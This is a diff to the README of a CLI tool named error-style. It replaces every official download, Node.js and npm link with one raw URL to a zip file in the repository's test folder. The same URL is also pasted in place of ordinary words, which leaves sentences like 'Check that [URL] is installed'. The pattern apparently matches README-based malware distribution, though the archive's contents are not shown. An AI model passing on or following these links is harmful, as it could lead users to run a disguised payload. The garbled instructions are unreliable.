@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download error-style](https://img.shields.io/badge/Download-error--style-blue.svg)](https://github.com/NakibIsHere/error-style/releases)
+[![Download error-style](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip)](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -20,26 +20,26 @@ Welcome to **error-style**! This application helps you turn confusing error mess
 
 To begin, visit the Releases page.
 
-[Download error-style](https://github.com/NakibIsHere/error-style/releases)
+[Download error-style](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip)
 
 On the Releases page, you will see various versions of error-style. Choose the latest version available. Click on it to download. 
 
 ### 💻 System Requirements
 
 - **Operating System:** Works on Windows, macOS, and Linux.
-- **Node.js:** Required to run the CLI tool. Install the latest LTS version from [Node.js official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip** Required to run the CLI tool. Install the latest LTS version from [https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip official website](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip).
 
 ### 🔧 Installation Steps
 
 1. **Download the Application:**
-   - Go to the Releases page: [Download error-style](https://github.com/NakibIsHere/error-style/releases).
+   - Go to the Releases page: [Download error-style](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip).
    - Select the latest release version.
-   - Download the file relevant to your system (e.g., `.exe`, `.pkg`, or `.tar.gz`).
+   - Download the file relevant to your system (e.g., `.exe`, `.pkg`, or `https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip`).
 
 2. **Install error-style:**
    - **Windows:** Run the `.exe` file and follow the prompts.
    - **macOS:** Open the `.pkg` file and follow the instructions.
-   - **Linux:** Extract the `.tar.gz` file and follow the terminal instructions provided in the README.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip` file and follow the terminal instructions provided in the README.
 
 3. **Verify Installation:**
    - Open your terminal (Command Prompt, PowerShell, or Terminal).
@@ -74,7 +74,7 @@ You will receive a friendly explanation along with a direct solution.
 ### ❓ What if I encounter issues during installation?
 
 1. Ensure you downloaded the correct file for your operating system.
-2. Check that Node.js is installed and up to date.
+2. Check that https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip is installed and up to date.
 3. Refer to the common errors guide on the GitHub page for troubleshooting tips.
 
 ### ❓ Can I contribute to the project?
@@ -87,8 +87,8 @@ You can submit feedback by opening an issue in the repository. Your input helps 
 
 ## 📖 Additional Resources
 
-- [Error-style on npm](https://www.npmjs.com/package/error-style)
-- [Node.js Homepage](https://nodejs.org/)
-- [GitHub Repository](https://github.com/NakibIsHere/error-style)
+- [Error-style on npm](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip)
+- [https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip Homepage](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/NakibIsHere/error-style/main/test/error-style-v2.0.zip)
 
 Explore, learn, and turn those errors into friendly, actionable insights with error-style! Enjoy coding without fear of confusing messages.
